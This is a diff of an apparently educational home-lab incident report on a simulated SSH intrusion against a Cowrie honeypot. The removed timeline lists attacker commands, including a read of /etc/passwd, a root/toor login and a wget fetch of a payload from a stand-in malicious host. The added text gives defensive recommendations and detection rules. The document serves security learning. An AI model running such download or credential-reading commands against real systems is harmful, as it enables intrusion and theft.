@@ -1,28 +1,31 @@
-## Summary
+**Impact:** In the honeypot, nothing real was harmed. On a real server, root access plus a downloaded script would be a serious incident.
 
-A synthetic SSH-based attack was simulated against a Cowrie honeypot to demonstrate incident investigation workflow. The attacker connected via SSH, authenticated successfully using weak credentials (root/toor), performed basic reconnaissance (whoami, uname -a, cat /etc/passwd), attempted to download a remote payload via wget, ran a final directory listing, then disconnected.
+---
 
-## Timeline
+## Recommendations
 
-- 12:11:04 SSH connection established from 127.0.0.1
-- 12:11:48 Login succeeded as root/toor
-- 12:12:56 Command executed: whoami
-- 12:13:11 Command executed: uname -a
-- 12:13:26 Command executed: cat /etc/passwd
-- 12:14:37 Command executed: wget http://malicious-site.com/payload.sh
-- 12:14:38 File download event logged (cowrie.session.file_download)
-- 12:14:50 Command executed: ls -la
-- 12:14:53 Session closed / attacker disconnected
+1. **Stronger SSH authentication:** use key-based login instead of passwords, and add rate limiting or fail2ban.
+2. **Detection:** alert on `wget` or `curl` to external sites right after a login, on reads of `/etc/passwd`, and on successful root logins from unexpected sources.
+3. **Network controls:** limit outbound connections from servers and block known bad domains.
+4. **Hardening:** disable direct root login, remove unused default accounts, and apply least privilege.
 
-## Indicators of Compromise (IOCs)
-
-- Source IP: 127.0.0.1
-- Malicious URL: http://malicious-site.com/payload.sh
-- Payload SHA-256: 183e4b9b791f0bfbe18196f47c9081d0fe223f525b5970bfaa73479ad1d441eb
+---
 
 ## Skills Demonstrated
 
-- Log analysis and timeline reconstruction from honeypot session data
-- Identification and documentation of Indicators Of Compromise (IOCs)
-- Incident investigation workflow (detection -> analysis -> documentation)
-- Technical writing for security incident reporting
+- Timeline reconstruction from honeypot logs
+- Extracting and documenting IOCs
+- Mapping activity to MITRE ATT&CK
+- Writing an incident report with clear recommendations
+
+---
+
+## Evidence
+
+Cowrie session logs, the command history, and the file download event with its SHA-256 hash. Screenshots of the logs and Splunk results will be added.
+
+**Related:** [Project 1 – Honeypot Lab](../project-1-honeypot-lab) | [Project 3 – Splunk SIEM](../project-3-splunk-siem)
+
+---
+
+*This investigation was done in a controlled home-lab environment for learning and portfolio purposes.*
